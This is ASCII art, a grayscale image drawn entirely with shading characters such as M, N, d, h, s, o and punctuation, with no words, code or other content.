MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmhs/:----:://+/////++shhhhyyydNNNmdhdmmNNMMMMMMMMMMMMMMMMMNmhsoossyyysyyhmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmmddmmNMMMMMMMMMMMMMMMMMMMMMMMMNs/:--.-.---//::-------.......--::--.........----..:omNmdyssooyhmNNmmmmmNNNMMMNNNmmddhhyyyyhhdmNNNNNNmmmdyo++++/:--...................--////+oyyyhhdddhhhhhdNNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmy/.....-+hNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNN
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNdy+:------::///////+oyhhhhysosydNNNmhhdmNNNMMMMMMMMMMMMMMMMNmdhyssyyyysyyhdmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdhhdmNMMMMMMMMMMMMMMMMMMMMMMMMNd/:-...--.-://:--------....------:--..........--.--.-sdNmdys+++oydmNNNNNNNNNNmddhhhhhyhhhhhdmmmNNNNNmmmdhssso+/:-....................-:/++osyhdddysyhhysssyhmNNNNmmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNds:.....-odNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNdddd
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmhs+:--....--::::://+osyyyso+//+shmNNmdddmmNNMMMMMMMMMMMMMMMNNNmhysyyyyyyyyhdmNNMMMMMMMMMMMMMNNNMMMMMMMMMMMMMMMMMMMNNdhhhmNNMMMMMMMMMMMMMMMMMMMMMMMMds--.......-++/::--------------------..........-----..:odNmds+///oyhmNNNNNNNmdhyyssyyyyyhhdmNNNmNNNNmmddhhdddy+:-...................--/+syhhddddhhhhhhhysooshdmmmNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNds:.....:smNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdysss
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmds+/:--.....------://++ooo++++oossydmNNNmddmNNNNMMMMMMMMMMMMMMNNmhyyyyyyyyyyyhdmNMMMMMMMMMMMMMMMMMMMNNMMMMMMMMMMMMMNmhhhdNNMMMMMMMMMMMMMMMMMMMMMMMMms:.--.-----/++/:::------------------............----..../ymmho+//+oshdmmmmddhyyssoossyyhhddmmmmmNNmmddhhdmNmho:-..................-://+oyhdmmmmmmddhssyhhhhhhdmmmmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMms:-..../sdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdysoo
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmho+::---://++++/:---://++//+ossyysssydNNNmdddmNNNMMMMMMMMMMMMMMNNmdhyyyyyyyyyyhdNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdhyhmNMMMMMMMMMMMMMMMMMMMMMMMMmy:..--..---:++/::::------------------...........--:::-...--+dmhs+//++syhdddhyyssssssssyyhhdddmmmmNmmdhhdmNNmhso/--...............-:/+ooossyhdmmmdhhhysyhdddhyyyhdmNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNms/-...-+ymNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdhsss
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNMMNNNNNNNNNNNNNNNMMMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNdyo+////+oyhhdddhyo:----:////+osyysssssydmNNmdddmNNNNMMMMMMMMMMMMNNmddhyyyyyyyyyhdmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmhyydmNMMMMMMMMMMMMMMMMMMMMMMMmy+-.----..-:///:::::------------------.........----:::-...---/ydhs+/////+syhhyyssssssyyyyhhddmmmmmmdhhdmNNmdsoso+:-...........---:::/+oossosyhddhysssyhdddddyo//oydNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmy+-...-/sdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdhyyy
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNNNNNNNNNNNNmmmmmmmmmmmmmNNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmdyssoooosydmmNNNmdyso/-.-::////+osssso++oydNNNmdddmmNNNMMMMMMMMNNNNNmmhyyyyyyyyyyhdmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmhyydNNMMMMMMMMMMMMMMMMMMMMMMNy+:--------:///::::-------------------.........---::::/:-......-+yyo+/:---:+yyyyysssyyyyyhhddmmmmddhhdmNNmdyooosoo/-.........-::::::://+oooooossyhyssyhhyyhhdhyysyhmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmh+-...-:sdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdhyyy
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNNNNNNNNNNmmmmddddddhhdddddddddmmNNNNNNNMMMMMMMMMMMMMMNNmdddddhhyoooydmmNNMNmdyyyso/---::://+++oo++++oshdNNNmdddmmNNNMMMMMMMMMMNNNmdhyyyyyyyysyhdmNMMMMMMMMMMMMMMMMMMMMMMMMMMMNNdyyhmNNMMMMMMMMMMMMMMMMMMMMMNho/:--.---:///:::-----------.--------.......------:::/+o/-....----:+ys+/-...:+oyyyyyyyyyhhhdmmmmddhhdmNNNdysoooooo+:-........-:////::::/+++++++osyysossssydmmNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmy/-....:smMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdyyyy
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNNmmmmdddhhhhhhhhdddmmmmmmNNNNMMMMMMNNmmmmmmdhso+oyhdmNNNNNNmmdhhys+/---://////++sssoooyhmNNNNmddmmNNNMMMMMMMMMMNNmdhyyyyyyssssydmNMMMMMMMMMMMMMMMMMMMMMMMMMMNmdyyhNNMMMMMMMMMMMMMMMMMMMMMMmy+/:-.---:///::--.-----....`...-------------------::/+os+-....-:----/oo+-....-/oyyhhhhdddddmmmddhhdmNNmhyoooosoo++:--.......-://////////////++oooooo+++shdmmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmy+-..../ydMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmhyyyy
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNNNNmmmdddhhhhhhhhdddmmmmmNNNmmmddhhhs++shmmmmNNmmdmmmddhhhyo:--:////:::+ossso++oshdNNNNmddmmmNNNMMMMMMMMMNmdhyssyyyysssydNNMMMMMMMMMMMMMMMMMMMMMMMMMNmhyhdNNMMMMMMMMMMMMMMMMMMMMMMdy+/:---:/+//:----.----..`````..------------------:/+++oo/-------::::-:oo/-....-:oyhddddddmmmdhyhmNNNmhsooooooo++/:-..---------:::///:////////+++++++//+shdmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmy+-...-/ymNMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmhyyyy
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNmmdddhhhyyyyyhhhddhhyysooosooymNNNNNMmhysyhhsssyhhyo/---::::::/+osyyso++osydmNNNmddddmNNNMMMMMMMMNNmhyyssysssooshmNNNMMMMMMMMMMMMMMMMMMMMMNNmhhhmNNMMMMMMMMMMMMMMMMMMMMMNdy+/::-/+++/::-------..``````..---:::::-----------:+oo++/::-::::::///:::/++:....-/+yhdmmmmdddhhdmNNdyo+++++++++//:-.--://///:-----:::::///:///+++++////oydmmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNms:....-/ymNMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmhyyyy
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmmmddhhyyyyyssoo++////+ohdmNNNNMMMNNNmmmmhhyhdddyo/-..----:://oosssoooo++shmNNNmddddmmNNNMMMMMMNNmdhyssssso++oydmNMMMMMMMMMMMMMMMMMMMMMNNmdhddNNMMMMMMMMMMMMMMMMMMMMMNdy+/::/+oo//:::-----...`````.-::::::::::---------:+oo++/::::///::://::--:oys+----:/+oydddddddmNNmhs++//////////:::/+ooo++sys+-...--::-::::://+++o+++++oshdmmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNms/-..-:+hmNMMMMMMMMMMMMMMMMMMMMMMMMMMNmdhyyyy
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmmmdhsoosyhyyso++++/::/oyhdmmmNNMMMMMMMMMNNNNNNmmds+/--....--:::/+ossoo+///+ydNNNNddddmmNNNNMMMMNNmmhysssso++/+sdmNMMMMMMMMMMMMMMMMMMMMNNmhhhdNNMMMMMMMMMMMMMMMMMMMMMNdy+///+oo+//::::-....`````.--:::::::::::--::----:/+o++/::///////:///:::::ohdho/:::::/+oyhddmNNmho///////:::---://oyddho+sdmdy+:-...------:://++ooossssssyydmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNds/-.--/ohmNMMMMMMMMMMMMMMMMMMMMMMMMMNmdyyyyy
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmmddhyssyyhdhys+/+ooo+/++oossyhddmNNNMMMMMNNMMMNNNmdhyo/-....-----:/ooo+++/:-:+ydNNNNmddddmmNNNNMMMNNdhyysso++///oymNMMMMMMMMMMMMMMMMMMMNNmhhhdNNMMMMMMMMMMMMMMMMMMMMMNdyo+++ooo+///:--.```````..--::----::::::--::---:/oo+//::///////////////++shmmdso/:::::/oydmmdyo+///++++/::----:/+syhhhssdmmmds+:-....----:://+oossssssyyyyyhdmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNdy+:---/ohmMMMMMMMMMMMMMMMMMMMMMMMMMNmhyssss
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmddmmdmmmdddhs/::+shhhhhhyyssyyyyyhhdmmNNNNMMMNNNNNmmddhs+/:-.-----://+////:--/oyyhdmNNNmddddmmNNMMMNNmdysoo+/////+ydmNMNMMMMMMMMMMMMNNMNNmdhhdmNMMMMMMMMMMMMMMMMMMMMMMmysoooooo++//:..````  ``.---------:::::--::::-:/+o+//:://///++////////++oyyhhdhyo/::://oossso++oo+o++++//:---:/+ossyyyyhNNNNNdys+/--.---::://++ooossyyyyysyyyhdmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmho:----+ymNMMMMMMMMMMMMMMMMMMMMMMMNmhs++++
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmmdmNNNmmdhdhso+shmmNNNNNmmmdddhhyyyyhhhddmmNNNNNNNNmmmNmmdyo/:-----::/:://::-:/osssyhdNNNNmddddmmNNNNmmdyso+/::////shmNNMMMMMMMMMMMMMMMMNmhyyhmNMMMMMMMMMMMMMMMMMMMMMMmhsoosoooo+//-``````  ``.----------:::----::-::+++//:://///+++/////////+osssoooooooo++//:::/+oossoo++////::/+oyhdddddddNMMMMMNNmhs/:---:://///+++osssyyyyyyysyyhdmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmho/-..-/ydNMMMMMMMMMMMMMMMMMMMMMMNmhs+///
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmmNNNNNmddmNmmmNNNMMMMMMMNNNNNmmmddhhyyhhhhddmmNNNNNNNNNNNNmdyo/-------::///:--:+sssssydmNNNmmddddmmmmmmdys+/:::///+shmNNNNMMMMMMMMMMMMMNmdyyymNMMMMMMMMMMMMMMMMMMMMMMNhsosso+o++/:.``````````.-:---------------:--:/++////////+++++////////+oyyo+++shdmdyo/-----:/+oooo++/:::/+syhdmNNMNNNNNMMMMMMMNNmhyo/:::://///++++oossyyyyyyssssyhdmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmhs/-..-/sdNMMMMMMMMMMMMMMMMMMMMMNmds/:::
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNNNNNMMMMMMMMMMMMMMMMMMMMNNNNNmmddhhyyyhhhddmmmNNNNMMMNNmds+/:-----:////:---/+ooooosyhdNNNmmdddddmmmdyo+::::///+oydmNNMMMMMMMMMMMMMNNdyssdmNMMMMMMMMMMMMMMMMMMMMMNhsosso+++/:-```````````.-:--------:----:::::/+++/::://+++++///::::::/oyhysshmNNmdyo/::----:/+++////:::/+shmNNMNMMMMNNmmmmNNMMMNNmdhso+//////+++++ooosssyyyssssoosyhmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNds:-..-/ymNMMMMMMMMMMMMMMMMMMMMNmds/::-
NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNmmdhhyyyhhhhdmmmNNNNNmmhyso+//::--:::::-...-::///++oyhdmNNNmmdddddhs+:::::///+oydmNMMMMMMMMMMMMMNNdysshmNMMMMMMMMMMMMMMMMMMMMMNhooosoo+/:-.``````````.----------:::--:::::/+++//:::/++++////:::---:+shdmmNNmhs+///////:::--::::::::-::+ohmNNNNNNNNmdhyyhmNNNNNNNmmdhyso+++++++++oooossssssssssooosydmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNds/----+hmMMMMMMMMMMMMMMMMMMMMNNds/:--
dmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmmdhhyyyyyyhhddddddddhhyyyso/:-------.....-:/++++osyhmmNNNNmdhhys+:----:://+shmNNMMMMMMMMMMMMNmhysydmNMMMMMMMMMMMMMMMMMMMMNds+oooo+:-.```````````.---------:::--::::::/++//:::/++++//::--...:+ydmNNNmhs+////////+++/:--.-....-----:/ohmNNNNmmddddhddmNNNNmmmNNNmdhysooooooooooooossssssssoooooosydmNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNds/:--/ohmNNMMMMMMMMMMMMMMMMMMNds/:--
+ydNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmmddhyyyyyyssosyyyyhddhhyso+/:----------://+++oossyyhdmNNNNmddyo:-----::/+oydmNNMMMMMMMMMMMNmhyshmNNMMMMMMMMMMMMMMMMMMMNds++ooo/-`````````````.----------:::::::::////:::::////::--..-/osdmNNmdhso+//////++++++++/:--..........-:/+shdmmNmddhdddmmmmmddmmNNNNNmdhyssssoooooooooooooooooo+++++osyhdmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNdy+:://ohmNNMMMMMMMMMMMMMMMMMNds/:--
:+ydmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmdddhysooooo+++ydddhyyyyso+/-------::://++++oossyyyyhdmmNNmdy/:-..---:/+shmNNNNMMMMMMMMNmdhyhdmNMMMMMMMMMMMMMMMMMMMNdso++++/.`````````````.---------::::::::::///::::--::-----/oydmNNmhyso+///////+++++++++////:--..........-:/+oyhddhhysyyyyhhdddmNNNMMMMNmmdhyysssssooooo+++++///////////+oshdNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmho+++oshmNNMMMMMMMMMMMMMMMMNds:-..
/+oshdmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmdyssyyo+//+yhhhhyyhdddhs+/-----:::////+++oosssssyyyhdmmmho/:-------:+shdmmNNNNNNNNNNmdyyydmNMMMMMMMMMMMMMMMMMMNdyo+++/:.`````````````.----------:::---::::::---.--:/+oshdmNmdhyo//:////++++++++++//////////::--.........-:/osyhsooossssshhdmNNMMMMMMMMNNmddhyysssssoo++//:::::::::::::::/+oydmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmhsooosyhmNNMMMMMMMMMMMMMMMNdo:...
oooosyhdmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmhsssys+::+oyyyyooyhdmdhyo+/::::::::::::/+oossyyyyyyyhhhyo+::----.--:+shdmmmmNNNNNNmdysshmNNMMMMMMMMMMMMMMMMMNmyoo+//-.``````````````.-----------.........--::+shdmNNNmdhyo+///:::///+++++++++///////////+///::---------:/+ssso+osyhysydmNMMMMMMMMMMMMNNNmdhyysssooo+//::------------:::::/oydmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmhyooosyhmNNMMMMMMMMMMMMMMNds:...
yysssssydmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmmdhs/--:/+/:--:/+++/--:+yddhhhyso++/:-------://++oossyyyyyyso+:-.--.--.-:+shdddddddddmddysoshdmmNNNNNNNNNMNNNMNNNmhso+/:-.``````````````................-:/+sydmmNNmdhyso++////++///://++++++++////+++oo++oo++/+oo+::////////+++///+sydddmmNMMMMMMMMMMMMMMMMNmmdyyssoo++//::---..--------::::::/+shmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmhyooosydmNMMMMMMMMMMMMMMNmy/-..
mddhyyyyhddmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNddhyo/-.``.-:++:----:--...:shhhhhysso+/:-...-----::/+oosssyyysso+:-.......-:oydmNNNmddddddysoooshddmmmmmmmmmmmNNNNNmyoo+/-..````````````````````..-::+oshdmNNNNNmdhyso//::////+++++++/::://+++////++osyhhyysyysoosyys//+o+//::://::::+yhmmNNNMMMMMMMMMMMMMMMMMMMNNmdysoo+++///:---.--------:::::::::/oydmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmhysoooshmNMMMMMMMMMMMMMMNh+-..
NNmdhhyyyyhhdmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmhs//+sdmNdy+-.--......:+oso/://///:-.......---://++oossssso+/:-.......-:+ydmmNNNNNNNmhyysyyhdddddddddddddddddhs+//::--........````.-+syyhhdmmNNNNmmddhyso++/////////++++oooo+++//::--://////++++osyddmmmdddmmdyoosyys+/---:::/+syhdmNNMMMMMMMMMMMMMMMMMMMMMMNNmhyooo+++//::----..----::::////::::+shmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdhs+++oydNMMMMMMMMMMMMMNds:..
MNNmmdhyyyyyyhdmNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmddmNNNNNmy/://::-.............-------........---::/++++oooo+:-........-:/+ossyhhdddddhyhhdmmNNNNNNNNNNNNmmmmddhhhysoooo+++/:-..-/shmmNNmmmdhyo++/////::::///+++///+oooooo++++++/::---::::/++++++oydmNNNNNNmdhssyso++:::/++++oossyhdmNNMMMMMMMMMMMMMMMMMMMMMNNNdhyso++++//::--------::://////::--/+yhmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNdy+///+ydNNMMMMMMMMMMMMmy/-.
MMMNNmdhhyyyyyyhdmNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmdhhyyso/-.`````````.-:+syyysoo+/:-.....--::///+++++/-........--::/::::////++++oossyhhddddmmmmmmmNNNNNmdhyssssooo+/--..-:/+++++///:::::///////:://///////+oooo++/////++//:-..--:/+oooooyhmmmNNNNmmdyyss+/+sysyyyssooooooosyhdmNNNMMMMMMMMMMMMMMMMMMMMNNmhsooo+++//::------:::://////::---/+yhmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmyo//:/sdNMMMMMMMMMMMMNho:-
MMMMMNNmdhhyyyyyhhdmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNmddyo/:-.```.``.:+syhhhhyyyso/:---------::::////:-.......--::///:::::///////:::///////+++oooosssssoo++++///::--......-:///////////////////:///////:/++++++///////////--.-:/+ossyhddmmmmmmmmmmmddyo/+ymmmmmdhysooooooooosyhdmNMMMMMMMMMMMMMMMMMMMMMNNdhsoo+++//:-------::::://///::---:/+sydNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmy+::-:sdNMMMMMMMMMMMNds/-
MMMMMMMNNmdhyyyyyyyhhmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNmdy+:-.....:/+o++//::::://///////:::---:::::-........--:://////++o+++///://::::/:////////////////////:::-......--://++++++//////++////////++///+++///////////:::-----:/+oyhdmmmdddhhyyyyssshhhdmNNNNNmmdhysoooooooo+++oshmNMMMMMMMMMMMMMMMMMMMMNNmdyso+///:--------:-:::::::::-----::+shmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNds/:::/shmMMMMMMMMMMNmy+:
MMMMMMMMNNNmdhyyysssoooymNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdyo:--.-:/+ooooooossysssoo++++++////////:-........--://///++++++///:://///////////////////////::::--........--::////++///////////++////+//////////////////::------:/+osyysssssyssooo++/oyhdmmNNNNNNmmddhysoooo++/::-:/oydmNMMMMMMMMMMMMMMMMMMNNmdyo+/:-------------:--::----.....--/shmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNds/:--/+ymNMMMMMMMMMNdo:
MMMMMMMMMMNNmdhhys+:-.../ohmMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdhs+:-:://+osyhddmmmmmddhhhyyssooo++//::-......-:////+++ooo++//////////::::://////////////::::---..........-----:////////////////////////+++++ooooooo++//::-----://ooo++//+oshhhyysoooosyhdmmmmNNNNNNmddys++/::-....-:+ydNNMMMMMMMMMMMMMMMMMNNmhs+:--.........--------...........-:oydNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNds/-.--+ymMMMMMMMMMMms/
MMMMMMMMMMMNNNmmdo:.``````-/hmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNdhso//:://+shmNNNNNNNNNmmmdhhyyysoo+//:-.....-::///+++ooo+++/////::::::-::::::://////::::----..............----://:::://////++++oo++++oooooosssyyyyssso+//:::::////://///ohmmddhysosyyhhdmmNMMMMMMMNNmdys+:-........-/symmNMMMMMMMMMMMMMMMMNNdhs/-............................--:/oydmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNds/...-+hmNMMMMMMMMNds
MMMMMMMMMMMMMMMNNy+.`    ```-+ymNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdyo+/::/+shmmNNNNMMMNNmmmdhyyyssoo+/:-......-:::///+++////////::::::::::::::::::::::----..............-://///////////++osyyyyhyyyssssoooosssyyhhyhhyyssssooooooo+ooo+/ohmmmmdhysyhhhhdmNMMMMMMMMMMNNNmhs/-.........-:+shmNNMMMMMMMMMMMMMMMMNmhs/:-......................---::::/+oydmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNds:-..-/sdNMMMMMMMMmh
MMMMMMMMMMMMMMMMMNds/.`   ````-ohmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmdddddmmmNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmmmdys++///++syhdmNNMMNNNmdhyyyyssssyso/-.....--::::://///////:::----:::::::::://///////:---...........-/oyyyysoooo++oossyhddhhddddhhhyysosssyhhhhhdddhhhhhhhhhhyyyyyyssydmmmmddhhhddmNMMMMMMMMMMMMMMMMMNdy+:..........-:+shmNNMMMMMMMMMMMMMMMNmhs+:------......----------::::::://+oydmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNms/-..-/ymNMMMMMMMNm
MMMMMMMMMMMMMMMMMMMNds+:.```..-:+shdmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdhyyyyyhhhdddmmmmNNNNMMMMMMMMMMMMMMMMMMMMMNMMMMMMMNNNNmmmmmddhyo/:::/+shdmNNMMMNmdhhhdhhyhmmmdy+-....----::::://///++///::////++++osssssssssso+//::--.....---:+shdmmdhyyyyyyyyyhddddddmmmmmmmdhyyyyhhhdddmmmmmmmmmmdddhhdddddhhdmNNNNmmmNNNMMMMMMMMMMMMMMMMMMMMMNmhs+:.........--/+shmNNMMMMMMMMMMMMMMNmdyo+::--------::::::::::::::/::::://oydmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNds:...-/ymNMMMMMMMM
